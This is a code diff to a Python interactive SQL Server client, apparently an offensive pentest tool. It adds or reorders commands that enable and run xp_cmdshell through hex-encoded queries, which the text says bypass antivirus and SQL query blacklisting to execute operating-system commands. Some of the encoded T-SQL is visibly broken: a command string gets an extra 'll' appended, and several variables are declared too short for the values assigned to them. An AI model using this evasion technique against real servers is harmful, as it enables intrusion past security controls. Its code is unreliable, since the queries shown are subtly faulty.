@@ -44,10 +44,10 @@ if __name__ == '__main__':
      exit                       - terminates the server process (and this session)
      enable_xp_cmdshell         - you know what it means
      disable_xp_cmdshell        - you know what it means
+     enable_hexp_cmdshell	- enable xp_cmdshell using hex encoding to bypass AV/SQL query blacklisting
+     disable_hexp_cmdshell	- disables xp_cmdshell using hex encoding to bypass AV/SQL query blacklisting
+     hexp_cmdshell {cmd}	- executes cmd using hex encoded xp_cmdshell
      xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
-     enable_hexp_cmdshell	    - enabled xp_cmdshell using hex encoding to bypass AV/SQL query blacklisting
-     disable_hexp_cmdshell	    - disables xp_cmdshell using hex encoding to bypass AV/SQL query blacklisting
-     hexp_cmdshell {cmd}	    - executes cmd using hex encoded xp_cmdshell
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
      ! {cmd}                    - executes a local shell cmd
      """) 
@@ -64,7 +64,7 @@ if __name__ == '__main__':
             except:
                 pass
 
-        def do_HexP_cmdshell(self, s):
+        def do_hexp_cmdshell(self, s):
             try:
                 self.sql.sql_query("DECLARE @x char(11); SET @x=0x78705f636d647368656c6c; EXEC @x + 'll ' + '%s'" % s)
                 self.sql.printReplies()
@@ -98,13 +98,12 @@ if __name__ == '__main__':
             try:
                 self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                                    "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
-                print('Normal xp_cmdshell used')
                 self.sql.printReplies()
                 self.sql.printRows()
             except:
                 pass
 
-        def do_enable_HexP_cmdshell(self, line):
+        def do_enable_hexp_cmdshell(self, line):
             try:
                 self.sql.sql_query("DECLARE @d char(9); SET @d=0x73686f7720616476616e636564206f7074696f6e73; EXEC sp_configure @d, 1; RECONFIGURE; DECLARE @x char(9); SET @x=0x78705f636d647368656c6c; EXEC sp_configure @x, 1; RECONFIGURE;")
                 self.sql.printReplies()
@@ -120,8 +119,7 @@ if __name__ == '__main__':
                 self.sql.printRows()
             except:
                 pass
-            
-        def do_disable_HexP_cmdshell(self, line):
+        def do_disable_hexp_cmdshell(self, line):
             try:
                 self.sql.sql_query("DECLARE @d char(9); SET @d=0x73686f7720616476616e636564206f7074696f6e73; EXEC sp_configure @d, 0; RECONFIGURE; DECLARE @x char(9); SET @x=0x78705f636d647368656c6c; EXEC sp_configure @x, 0; RECONFIGURE;")
                 self.sql.printReplies()
